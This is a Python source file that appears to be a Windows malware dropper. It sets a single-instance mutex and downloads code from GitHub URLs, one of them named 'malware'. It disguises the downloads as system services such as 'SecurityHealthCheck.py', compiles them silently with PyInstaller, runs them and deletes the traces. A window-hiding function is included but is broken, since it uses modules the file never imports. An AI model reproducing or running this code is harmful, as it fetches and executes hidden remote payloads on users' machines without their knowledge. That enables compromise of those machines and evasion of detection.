import os
import sys
import urllib.request
import subprocess
import random
import shutil
import win32api
import win32con
import win32event
import win32clipboard
import ctypes

def create_mutex(mutex_name):
    try:
        print(f"Creating mutex: {mutex_name}")
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            print(f"Mutex {mutex_name} already exists.")
            return False
        print(f"Mutex {mutex_name} created successfully.")
        return True
    except Exception as e:
        print(f"Error creating mutex: {e}")
        return False

if os.name == "nt":
    mutex_name = "WindowsSessionHandler"
    if not create_mutex(mutex_name):
        print("Mutex already exists. Exiting program.")
        sys.exit(0)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_python_code(url):
    try:
        print(f"Fetching code from URL: {url}")
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            code = response.read().decode('utf-8')
        print(f"Code fetched successfully from {url}")
        return code
    except Exception as e:
        print(f"Error fetching URL {url}: {e}")
        return None

def write_python_file(code, filename):
    try:
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, filename)
            print(f"Writing to file: {py_file_path}")
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            print(f"File written successfully: {py_file_path}")
            return py_file_path
    except Exception as e:
        print(f"Error writing file {filename}: {e}")
    return None

def compile_python_to_exe(py_file_path):
    try:
        if py_file_path:
            print(f"Compiling Python file to EXE: {py_file_path}")
            temp_dir = os.getenv('TEMP')
            dist_folder = os.path.join(temp_dir, "dist")
            build_folder = os.path.join(temp_dir, "build")
            
            subprocess.run([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--icon=NONE',
                f'--distpath={dist_folder}',
                f'--workpath={build_folder}',
                py_file_path
            ], check=True)
            
            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
            if os.path.exists(exe_file_path):
                print(f"EXE compiled successfully: {exe_file_path}")
                return exe_file_path
            else:
                print(f"Error: EXE not found in dist folder.")
    except Exception as e:
        print(f"Error compiling {py_file_path}: {e}")
    return None

def execute_exe_file(exe_file_path):
    try:
        if exe_file_path:
            print(f"Executing EXE file: {exe_file_path}")
            subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
            print(f"Execution started for {exe_file_path}")
    except Exception as e:
        print(f"Error executing {exe_file_path}: {e}")

def clean_up(temp_files):
    try:
        print(f"Cleaning up temporary files: {temp_files}")
        for item in temp_files:
            if os.path.exists(item):
                if os.path.isdir(item):
                    shutil.rmtree(item)
                    print(f"Deleted directory: {item}")
                else:
                    os.remove(item)
                    print(f"Deleted file: {item}")
    except Exception as e:
        print(f"Error cleaning up files: {e}")

def install_and_execute(urls_and_filenames):
    temp_dir = os.getenv('TEMP')
    temp_files = []
    exe_files = []

    # Step 1: Download Python files
    for url, filename in urls_and_filenames:
        code = fetch_python_code(url)
        if code:
            py_file_path = write_python_file(code, filename)
            if py_file_path:
                temp_files.append(py_file_path)

    # Step 2: Compile each Python file into an executable
    for py_file_path in temp_files:
        exe_file_path = compile_python_to_exe(py_file_path)
        if exe_file_path:
            exe_files.append(exe_file_path)

    # Step 3: Execute the generated executable files
    for exe_file_path in exe_files:
        execute_exe_file(exe_file_path)

    # Step 4: Clean up temporary files and directories
    dist_folder = os.path.join(temp_dir, "dist")
    build_folder = os.path.join(temp_dir, "build")
    temp_files.extend([dist_folder, build_folder])
    clean_up(temp_files)

# URLs and filenames to download and compile
urls_and_filenames = [
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
]

def set_invisible():
    try:
        hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window
        print(f"Making window with handle {hwnd} invisible.")
        # Make the window invisible on taskbar
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window

        # Set window transparency to 100% (completely invisible)
        extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
        win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
        win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent

        # Set TopMost to False, so window cannot be touched or interacted with
        win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

        # Make sure the window remains undetected
        gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar
        print(f"Window successfully made invisible.")
    except Exception as e:
        print(f"Error setting window invisible: {e}")

install_and_execute(urls_and_filenames)
